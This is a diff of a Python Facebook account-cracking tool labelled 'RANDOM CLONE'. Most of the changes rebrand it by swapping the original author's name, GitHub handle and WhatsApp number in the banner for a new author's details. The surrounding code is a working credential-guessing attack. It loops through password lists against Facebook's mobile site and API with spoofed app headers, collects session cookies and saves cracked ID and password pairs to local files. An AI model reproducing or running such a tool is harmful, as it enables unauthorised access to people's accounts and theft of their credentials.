@@ -72,13 +72,13 @@ logo = ("""
 \033[1;94m _/ // /|  / /|  / /_/ / /___/ /___/ /|  / / /    
 \033[1;95m/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/     \033[1;92m
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- ┃ [\033[1;91m✓\033[1;92m] AUTHOR    \033[1;91m: \033[1;92mMUMIT ISLAM HIMU           ┃
+ ┃ [\033[1;91m✓\033[1;92m] AUTHOR    \033[1;91m: \033[1;92mSABBIR BHAI          ┃
  ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
  ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
  ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
- ┃ [\033[1;91m✓\033[1;92m] GITHUB    \033[1;91m: \033[1;92mMUMIT-404-CYBER            ┃
- ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mMumit Islam                ┃
- ┃ [\033[1;91m✓\033[1;92m] WHATSAPP  \033[1;91m: \033[1;92m+8801644777805             ┃
+ ┃ [\033[1;91m✓\033[1;92m] GITHUB    \033[1;91m: \033[1;92mSABBIR-BHAI            ┃
+ ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mSABBIR               ┃
+ ┃ [\033[1;91m✓\033[1;92m] WHATSAPP  \033[1;91m: \033[1;92m+8801840762780             ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
 
 def linex():
@@ -432,7 +432,7 @@ def ffb7(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b[38;5;126m [SABBIR-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/INNOCENT-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -523,7 +523,7 @@ def rcrack_free(idf,pwv):
 		for ps in pwv:
 	#		print(idf+'|'+ps)
 			#session = requests.Session()
-			sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write(f'\r\r\033[1;37m [SABBIR-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(useragent)
 			free_fb = session.get('https://m.alpha.facebook.com').text
@@ -558,7 +558,7 @@ def rcrack_free(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
 				print('\n')
-				print('\033[1;92m[INNOCENT-OK] '+idf+' | '+ps+'\033[0;97m')
+				print('\033[1;92m[SABBIR-OK] '+idf+' | '+ps+'\033[0;97m')
 				cek_apk(coki)
 				open('ok.txt', 'a').write(idf+' | '+ps+'\n')
 				oks.append(idf)
@@ -567,7 +567,7 @@ def rcrack_free(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				print('\n')
-				print('\033[1;91m[INNOCENT-CP] '+idf+' | '+ps+'\033[0;97m')
+				print('\033[1;91m[SABBIR-CP] '+idf+' | '+ps+'\033[0;97m')
 				open('cp.txt', 'a').write(idf+' | '+ps+'\n')
 				cps.append(idf)
 				break
@@ -575,7 +575,7 @@ def rcrack_free(idf,pwv):
 				continue
 		loop+=1
 		bo = random.choice([m,k,h,b,u,x])
-		sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write(f'\r\r\033[1;37m [SABBIR-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		sys.stdout.flush()
 	
 	except:
@@ -583,7 +583,7 @@ def rcrack_free(idf,pwv):
 def apix(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [ISABBIR-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -628,19 +628,19 @@ def apix(ids,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [INNOCENT-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/INNOCENT-XD-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [ISABBIR-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/Md Sabbir Bhai-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
-                                elif 'www.facebook.com' in q['error']['message']:
+                                elif 'mbasic.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
                                                 print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open(f'/sdcard/INNOCENT-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open(f'/sdcard/INNOCENT-XD-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/SABBIR-XD-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
